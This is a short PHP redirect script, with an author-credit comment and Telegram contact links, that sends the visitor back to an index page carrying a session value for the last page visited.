<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once 'includes/main.php';
    $red = $_SESSION['last_page'];
    header("Location: ../index.php?redirection=$red");
    exit();
?>